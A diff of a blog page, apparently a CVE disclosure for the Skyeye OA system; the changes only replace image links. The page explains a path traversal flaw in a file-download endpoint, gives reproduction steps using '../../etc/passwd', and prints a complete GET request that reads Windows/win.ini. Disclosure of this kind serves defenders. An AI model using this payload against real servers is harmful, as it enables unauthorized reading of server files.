@@ -23,22 +23,22 @@
 <meta property="og:site_name" content="Backk0m&#39;s Blog">
 <meta property="og:description" content="Product IntroductionSkyeye Cloud-Intelligent Office OA System [SpringBoot2-Rapid Development Platform] is designed for management in institutions such as hospitals, schools, and small-to-medium enterp">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/wps1.jpg">
-<meta property="og:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/wps2.jpg">
-<meta property="og:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/wps3.jpg">
-<meta property="og:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/wps4.jpg">
-<meta property="og:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/wps5.jpg">
-<meta property="og:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/wps6.jpg">
-<meta property="og:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/wps7.jpg">
-<meta property="og:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/wps8.jpg">
-<meta property="og:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/1.png">
-<meta property="og:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/1.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/2.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/3.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/4.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/5.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/6.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/7.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/8.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/10.png">
 <meta property="article:published_time" content="2025-04-13T11:19:21.000Z">
-<meta property="article:modified_time" content="2025-04-13T11:31:08.615Z">
+<meta property="article:modified_time" content="2025-04-13T12:08:02.848Z">
 <meta property="article:author" content="Backk0m">
 <meta property="article:tag" content="CVE">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://backk0m.github.io/.io//Blog/source_posts/assets/wps1.jpg">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/backk0m/image-bed/1.jpg">
   
   
   
@@ -298,21 +298,21 @@
               <div class="markdown-body">
                 
                 <h3 id="Product-Introduction"><a href="#Product-Introduction" class="headerlink" title="Product Introduction"></a><strong>Product Introduction</strong></h3><p>Skyeye Cloud-Intelligent Office OA System [SpringBoot2-Rapid Development Platform] is designed for management in institutions such as hospitals, schools, and small-to-medium enterprises. It integrates diverse advanced functionalities including online file operations, log management, attendance tracking, CRM, ERP inventory management, project management, drag-and-drop questionnaire builder, scheduling, note-taking, task planning, administrative functions, and other complex business processes.</p>
-<h3 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a><strong>Vulnerability Analysis</strong></h3><p><img src="/.io//Blog\source_posts\assets\wps1.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<h3 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a><strong>Vulnerability Analysis</strong></h3><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/1.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>\skyeye\skyeye-promote\skyeye-code-doc\src\main\java\com\skyeye\eve\controller\CodeModelHistoryController.java</p>
-<p><img src="/.io//Blog\source_posts\assets\wps2.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/2.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>\skyeye\skyeye-promote\skyeye-code-doc\src\main\java\com\skyeye\eve\service\impl\CodeModelHistoryServiceImpl.java</p>
-<p><img src="/.io//Blog\source_posts\assets\wps3.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/3.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>After receiving the filePath parameter submitted by a user, the system does not implement any security filtering measures (such as path normalization, blacklist validation, etc.). Instead, it directly concatenates the parameter with the base directory path as a string and executes file download operations based on the resulting full path. Due to the lack of validation for user input legitimacy, attackers can craft malicious parameters containing path traversal sequences (e.g., ..&#x2F;..&#x2F;etc&#x2F;passwd) to achieve arbitrary file downloads from the server.</p>
 <p><strong>Vulnerability</strong> <strong>Reproduction</strong></p>
-<p><img src="/.io//Blog\source_posts\assets\wps4.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
-<p><img src="/.io//Blog\source_posts\assets\wps5.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
-<p><img src="/.io//Blog\source_posts\assets\wps6.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
-<p><img src="/.io//Blog\source_posts\assets\wps7.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
-<p><img src="/.io//Blog\source_posts\assets\wps8.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/4.jpg" srcset="/img/loading.gif" lazyload> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/5.jpg" srcset="/img/loading.gif" lazyload> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/6.jpg" srcset="/img/loading.gif" lazyload> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/7.jpg" srcset="/img/loading.gif" lazyload> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/8.jpg" srcset="/img/loading.gif" lazyload> </p>
 <p>Configuration templates and code generation options can be freely entered. After clicking “Download,” intercept the network traffic (e.g., via packet capture tools), modify the filePath parameter to include path traversal sequences (e.g., ..&#x2F;..&#x2F;etc&#x2F;passwd), and exploit the vulnerability to achieve arbitrary file downloads from the server.</p>
-<p><img src="/.io//Blog\source_posts\assets\1.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
-<p><img src="/.io//Blog\source_posts\assets\2.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/9.png" srcset="/img/loading.gif" lazyload> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/10.png" srcset="/img/loading.gif" lazyload> </p>
 <h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a><strong>Payload</strong></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/dev/reqBase/codemodel017?filePath=../../../../../Windows/win.ini</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;133&quot;, &quot;Chromium&quot;;v=&quot;133&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>cross-site<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://119.91.201.97:8088/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br, zstd<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>HttpOnly<br></code></pre></td></tr></table></figure>
 
 
